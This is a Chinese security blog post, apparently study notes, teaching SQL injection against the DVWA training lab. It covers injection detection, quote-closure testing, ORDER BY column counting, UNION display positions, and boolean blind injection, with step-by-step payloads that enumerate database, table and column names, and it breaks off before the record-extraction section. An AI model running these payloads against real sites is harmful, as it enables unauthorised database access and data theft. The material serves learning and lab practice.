href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 1.05rem;">文件上传<sup>2</sup></a><a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 1.05rem;">文件包含<sup>2</sup></a><a href="/tags/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB/" style="font-size: 1.05rem;">日常生活<sup>2</sup></a><a href="/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" style="font-size: 1.05rem;">环境搭建<sup>7</sup></a><a href="/tags/%E9%9D%B6%E5%9C%BA/" style="font-size: 1.05rem;">靶场<sup>7</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2025/05/"><span class="card-archive-list-date">五月 2025</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">41</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/OWASP/" itemprop="url">OWASP</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>sql注入</span></a></span></div></div><h1 class="post-title" itemprop="name headline">SQL</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2025-05-27T11:10:07.000Z" title="发表于 2025-05-27 19:10:07">2025-05-27</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2025-05-27T11:11:04.631Z" title="更新于 2025-05-27 19:11:04">2025-05-27</time></span></div><div class="meta-secondline"><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为合肥"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>合肥</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src=""></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2025/05/27/SQL/"><header><a class="post-meta-categories" href="/categories/OWASP/" itemprop="url">OWASP</a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" tabindex="-1" itemprop="url">sql注入</a><h1 id="CrawlerTitle" itemprop="name headline">SQL</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Attackxu</span><time itemprop="dateCreated datePublished" datetime="2025-05-27T11:10:07.000Z" title="发表于 2025-05-27 19:10:07">2025-05-27</time><time itemprop="dateCreated datePublished" datetime="2025-05-27T11:11:04.631Z" title="更新于 2025-05-27 19:11:04">2025-05-27</time></header><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1711986767135-834b7008-7626-4ccf-bc8e-227052e883cd.png"></p>
+<h1 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h1><h2 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h2><p>最为经典的单引号判断法</p>
+<p>利用<code>&#39;</code>或<code>&#39;&#39;</code>来判断是否存在漏洞，在参数后面加上单引号，比如<code>http://xxx/abc.php?id=1&#39;</code>，如果页面返回错误，则存在SQL注入<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718865537767-614e03c9-908c-41e8-a0bb-56587bfe50f1.png" alt="返回的错误信息"></p>
+<p>原因是无论是字符型还是数字型都会因为单引号个数不匹配而报错</p>
+<p>（如果未报错，不代表不存在SQL注入，因为有可能是页面对单引号进行了过滤，这时可以使用判断语句进行注入）</p>
+<h2 id="判断闭合方式："><a href="#判断闭合方式：" class="headerlink" title="判断闭合方式："></a>判断闭合方式：</h2><p>?id&#x3D;1’</p>
+<p>?id&#x3D;1”</p>
+<p>结果一：如果都报错</p>
+<p>判断闭合符为：整形闭合。</p>
+<p>结果二：如果单引号报错，双引号不报错。</p>
+<p>继续尝试</p>
+<p>?id&#x3D;1’ –+</p>
+<p>结果1：无报错</p>
+<p>判断闭合符为：单引号闭合。</p>
+<p>结果2：报错</p>
+<p>判断闭合符可能为：单引号加括号。</p>
+<p>结果三：如果单引号不报错，双引号报错。</p>
+<p>继续尝试</p>
+<p>?id&#x3D;1” –+</p>
+<p>结果1：结果无报错</p>
+<p>判断闭合符为：双引号闭合。</p>
+<p>结果2：报错</p>
+<p>判断闭合符可能为：双引号加括号。</p>
+<h2 id="判断SQL注入的类型"><a href="#判断SQL注入的类型" class="headerlink" title="判断SQL注入的类型"></a>判断SQL注入的类型</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44275213/article/details/118892912">【干货】如何判断 Sql 注入点_判断是否存在sql注入-CSDN博客</a></p>
+<blockquote>
+<p>通常SQL注入数据类型分为两种</p>
+<ol>
+<li>字符型</li>
+<li>数字型</li>
+</ol>
+</blockquote>
+<p>数字型和字符型的区别就是，网站源文件中的sql查询语句有没有单引号，有单引号时，我们需要闭合单引号，为字符型</p>
+<h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><p>用经典的<code>1 and 1=1</code>和<code>1 and 1=2</code>来判断</p>
+<ol>
+<li>Url 地址中输入 <code>http://xxx/abc.php?id= 1 and 1=1</code> 页面依旧运行正常，继续进行下一步</li>
+<li>Url 地址中继续输入 <code>http://xxx/abc.php?id= 1 and 1=2</code> 页面运行错误，则说明此 Sql 注入为数字型注入。</li>
+</ol>
+<blockquote>
+<p>原因：</p>
+<p>当输入 and 1&#x3D;1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; 1 and 1&#x3D;1 没有语法错误且逻辑判断为正确，所以返回正常。</p>
+<p>当输入 and 1&#x3D;2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id &#x3D; 1 and 1&#x3D;2 没有语法错误但是逻辑判断为假，所以返回错误。</p>
+</blockquote>
+<h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><p>用 <code>1&#39; and &#39;1&#39;=&#39;1</code> 和<code>1&#39; and &#39;1&#39;=&#39;2</code>来判断</p>
+<ol>
+<li>Url 地址中输入<code>http://xxx/abc.php?id= 1&#39; and &#39;1&#39;=&#39;1</code>页面运行正常，继续进行下一步。</li>
+<li>Url 地址中继续输入<code>http://xxx/abc.php?id= 1&#39; and &#39;1&#39;=&#39;2</code>页面运行错误，则说明此 Sql 注入为字符型注入。</li>
+</ol>
+<blockquote>
+<p>前者显示，后者不显示，说明单引号起作用了</p>
+<p>1：前者最终查询的是<code>id=&#39;1&#39;并且&#39;1&#39;=&#39;1&#39;</code></p>
+<p>2：后者最终查询的是<code>id=&#39;1&#39;并且&#39;1&#39;=&#39;2&#39;</code>，因为’1’&#x3D;’2’不成立，所以整条语句也不成立，页面返回为空或者错误是由于sql语句不成立导致的</p>
+</blockquote>
+<p>当注入类型为字符型时，牵涉到MySQL的隐式类型转换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;2admin&#x27; ==&gt;2</span><br><span class="line">&#x27;admin&#x27;==&gt;0</span><br><span class="line">&#x27;33admin&#x27;==&gt;33</span><br><span class="line"></span><br><span class="line">//数字+字符-&gt;数字</span><br><span class="line">//字符		-&gt;0</span><br><span class="line">//数字		-&gt;数字</span><br><span class="line">//就是当我们输入查询的内容为	1addsdad	,最终进行隐式转换后查询的还是为	1</span><br></pre></td></tr></table></figure>
+
+<p>因此当注入点为字符型时，我们输入数字型的判断语句<code>1 and 1=1</code>和<code>1 and 1=2</code>，都会经过隐式转换为<code>1</code>,因此查询结果相同</p>
+<h2 id="判断表中字段数"><a href="#判断表中字段数" class="headerlink" title="判断表中字段数"></a>判断表中字段数</h2><p>用order by来判断</p>
+<blockquote>
+<p>原理：order by是用来根据指定的列来对结果进行排序，当order by后的数字大于当前的列数时就会报错</p>
+</blockquote>
+<p>当我们使用order by时，如果注入点为字符型，输入<code>1&#39; order by 5</code>，后台查询为<code>select * from &lt;表名&gt; where id = &#39;1&#39; order by 5&#39; </code>此时单引号没有闭合，因此要在<code>order by 数字 </code>后面加上<code>#</code>注释掉多余的<code>&#39;</code></p>
+<p>在Url中#会被自动编码为%23（如果不进行Url编码，那么#无法传到后端数据库中，带入查询时无法起作用）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718871991073-65406349-fb29-4f6a-b83d-62ec7301af34.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718872055793-42c288a4-071b-439e-8fb4-b9c061ad3897.png"></p>
+<h2 id="确定显示位"><a href="#确定显示位" class="headerlink" title="确定显示位"></a>确定显示位</h2><p>显示位：服务端执行SQL语句查询数据库中的内容，客户端将数据展示在页面中，这个展示数据的位置就叫做显示位	</p>
+<p>union操作符：用于合并两个或多个select的结果集</p>
+<ol>
+<li>结果集的列名总是等于union中第一个select语句中的列名</li>
+<li>union内的select语句必须拥有相同数量的列，列也必须有相似的数据类型</li>
+<li>每条select语句中列的顺序必须相同</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select 1,2,...#		(列数)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718873391517-362a6464-af7d-4d3c-8e8b-1382e37e7526.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718874092900-d6d7151d-3d67-4c20-8ac0-85a3f81615e9.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718874179898-687a8e18-6bf0-4235-b83d-6defbb1a32e3.png"></p>
+<blockquote>
+<p>在实战中一般不查询union左边的内容，这是因为程序在展示数据的时候通常只会取结果集的第一行数据，所以只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。所以让union左边查询不到，可以将其 改为负数或者改为比较大的数字。</p>
+</blockquote>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p>前端里没有显示位，不能返回sql语句执行错误的信息，输入正确和错误返回的信息都是一致的</p>
+<p>类似于无法说话的人，只能通过点头和摇头回复正确与否</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>在页面中，正确执行了用户构造的sql语句，返回一种页面，如果sql执行错误，返回另一种页面</p>
+<p>true 和 false</p>
+<ul>
+<li><code>count()</code>来判断数量</li>
+<li><code>length()</code>来判断长度</li>
+<li><code>substr()和limit()</code>来判断具体数据</li>
+</ul>
+<h3 id="注入流程"><a href="#注入流程" class="headerlink" title="注入流程"></a>注入流程</h3><ol>
+<li>判断是否存在注入</li>
+<li>获取数据库长度</li>
+<li>逐字猜解数据库名</li>
+<li>猜解表名数量</li>
+<li>猜解某个表名长度</li>
+<li>逐字猜解表名</li>
+<li>猜解列名数量</li>
+<li>猜解某个列名长度</li>
+<li>逐字猜解列名</li>
+<li>判断数据数量</li>
+<li>猜解某条数据长度</li>
+<li>逐位猜解数据</li>
+</ol>
+<h3 id="判断是否存在注入-1"><a href="#判断是否存在注入-1" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h3><p>一般使用<code>1 and 1=1</code>、<code>1 and 1=2</code>、<code>1&#39; and &#39;1&#39;=&#39;1</code>、<code>1&#39; and &#39;1&#39;=&#39;2</code>来进行判断</p>
+<p>一般输入时页面会返回两种情况，一种是对应true，一种是对应false</p>
+<p>举例：</p>
+<p>当输入<code>1 and 1=1</code>、<code>1 and 1=2</code>、<code>1&#39; and &#39;1&#39;=&#39;1</code>时，页面都返回“exists“，存在，表示true</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719406739446-f28942bf-01a0-4ee6-961e-f4b6c73cc2ac.png"></p>
+<p>当输入<code>1&#39; and &#39;1&#39;=&#39;2</code>时，页面返回”missing“，不存在，表示false</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719406868047-29f0b94a-a93b-49cf-ae54-f179d418b089.png"></p>
+<p>页面返回两种情况，说明存在注入</p>
+<h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><h4 id="获取数据库名长度"><a href="#获取数据库名长度" class="headerlink" title="获取数据库名长度"></a>获取数据库名长度</h4><p>使用length()函数来判断</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719411466517-520af77c-6686-4608-82ef-7334bd0e9f6e.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719411513070-81b87fe8-2ed0-4832-9747-896a59974490.png"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719411567067-aa2920b5-c2b2-4ae1-ae3b-ca3fef240a34.png"></p>
+<h4 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h4><p>用substr()函数对数据库名进行字符串截取，以次判断每一位上的字母</p>
+<blockquote>
+<p>substr(string,start,length)</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719411846868-46b70666-54a0-4ffc-9727-6bd709365923.png"></p>
+<p>修改start的位置，可以得出其他位置的字母，从而得出完整的数据库名</p>
+<p>可以爆破</p>
+<h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><h4 id="获取表的数量"><a href="#获取表的数量" class="headerlink" title="获取表的数量"></a>获取表的数量</h4><p>使用count()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select count(table_name) from information_schema.tables where table_schema=&#x27;dvwa&#x27;)=2%23</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>统计数据表中包含的记录行的总数，或者根据查询结果返回列中包含的数据行\</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719456554986-9dc7c2db-0528-4cb3-9152-42d239ba325c.png" alt="大于1为true，大于2为false"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719456592344-217c3e48-fcd4-4997-89b6-6f9c2970c858.png" alt="再次验证，等于2为true，说明一共两个表"></p>
+<h4 id="获取表名长度"><a href="#获取表名长度" class="headerlink" title="获取表名长度"></a>获取表名长度</h4><p>分别获取两个表的表名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1))&gt;1%23</span><br><span class="line">两个括号：里面的括号表示里面是一个整体，外面的括号是length函数带的括号（如果只写一个的话，有逗号可能会被认为是两个参数导致函数错误）</span><br><span class="line">用limit限制只输出第一行的内容（也就是第一个表名）</span><br><span class="line">（因为是有两个表，在输出的时候每个表占一行输出，先求第一个表长度只需要第一个表名）</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719457929979-c3cefa23-0b4f-4def-9f4a-be8d625cb181.png" alt="第一个表长度为9"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and length((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 1,1))=5%23</span><br><span class="line">将limit的起始位置改为1，步长还为1，能够只输出第二行（第二张表）</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719458053192-33945394-44fa-4b4c-ae20-a3da959bc100.png" alt="第二个表长度为5"></p>
+<h4 id="获取具体表名"><a href="#获取具体表名" class="headerlink" title="获取具体表名"></a>获取具体表名</h4><p>分别获取两个表具体的表名，使用substr()</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)=&#x27;g&#x27;%23 </span><br><span class="line">limit表示为第一个表</span><br><span class="line">substr从第一个表的第一个位置截取步长为1（第一个表的第一个字符）</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719458437932-32bf8802-65df-43cd-88e1-8be4c09109fe.png" alt="第一个表的第一个字母为g"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719458630231-7b10a2b6-d59b-4ffa-b777-c32c60680613.png" alt="爆破点为substr的第二个参数（起始位置）和后面的字符"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;dvwa&#x27; limit 1,1),1,1)=&#x27;g&#x27;%23 </span><br><span class="line">第二张表，将limit的第一个参数改为1</span><br><span class="line">爆破点和爆破第一个表相同</span><br></pre></td></tr></table></figure>
+
+<h3 id="获取字段名（列名）"><a href="#获取字段名（列名）" class="headerlink" title="获取字段名（列名）"></a>获取字段名（列名）</h3><h4 id="获取某个表中有多少列"><a href="#获取某个表中有多少列" class="headerlink" title="获取某个表中有多少列"></a>获取某个表中有多少列</h4><p>分别查看两个表各有多少列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;guestbook&#x27; and table_schema=&#x27;dvwa&#x27;)&gt;1%23</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719460454279-716a4c5b-5ea9-4672-b951-b56ac3ebaaa8.png" alt="guestbook表有三列"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719460687710-67387e60-878c-46fe-9c19-25c85849b932.png" alt="users表有8列"></p>
+<h4 id="获取列名长度"><a href="#获取列名长度" class="headerlink" title="获取列名长度"></a>获取列名长度</h4><p>分别获取两个表的每个列名的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//length写在外面</span><br><span class="line">?id=1&#x27; and length((select column_name from information_schema.columns where table_name=&#x27;guestbook&#x27; and table_schema=&#x27;dvwa&#x27; limit 0,1))=10%23</span><br><span class="line">//写在里面</span><br><span class="line">?id=1&#x27; and (select length(column_name) from information_schema.columns where table_name=&#x27;guestbook&#x27; and table_schema=&#x27;dvwa&#x27; limit 0,1)=10%23</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719461329693-9fa3e13b-eaf8-4589-9250-bfdfd10df8ff.png"></p>
+<p>依次修改limit的第一个参数（从0-2，因为guestbook表有三列）和后面的数字参数，即可得出guestbook表每一列的列名的长度</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719461947591-d83d987a-08a2-48d6-a7b5-fb38c7b1f5f6.png" alt="三列，每列列名长度分别为10，7，4"></p>
+<p>将表名改为users，爆破点和上面一样，将第一个位置增加到8（一共8列）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719462115232-48622449-24b3-43b7-b00e-eb565b05f7c3.png" alt="users表中的8列的列名长度分别为7，10，9，4，8，6，10，12"></p>
+<h4 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h4><p>分别获取两个表中每一列的具体列名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and substr((select column_name from information_schema.columns where table_name=&#x27;guestbook&#x27; and table_schema=&#x27;dvwa&#x27; limit 0,1),1,1)=&#x27;a&#x27;%23 </span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719463867318-72ee5102-00b8-41c9-8f7c-fae442151144.png"></p>
+<p>依次改变substr函数截取的起始位直到10即可完整得到第一个列名。</p>
+<blockquote>
+<p>爆破点：substr的第二个参数（1-10，guestbook第一个表的第一列列名长度为10）</p>
+<p>后面的字符（a-z和_）</p>
+</blockquote>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719463846411-a1879e49-8602-446a-a42a-03aa91fa01f0.png" alt="第一列为comment_id"></p>
+<p>要获取第二个列名，只需要修改limit的起始位即可。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719463958117-a8de4c85-05c8-4107-b1e4-ed5a0679c3ba.png" alt="将0改为1，表示第二列"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719464053530-18bd00b7-adab-4c3e-a135-d5bd2ff48dd6.png" alt="第二列为comment"></p>
+<p>以此类推</p>
+<p>要获得users表的列名时，只需要更改为users</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719464130060-9ed3417f-9833-4707-9cda-1260883cfbc5.png"></p>
+<p>爆破点跟上面一样</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1719464193197-2a249235-bb7a-48fe-a16d-de9d4dd3f1c4.png" alt="users的第一列列名为user_id"></p>
+<h3 id="获取记录"><a href="#获取记录" class="headerlink" title="获取记录"></a>获取记录</h3><p>表中的每一列有多少行数据</p>
+<p>某行数据有多长</p>
+<p>具体是多少</p>
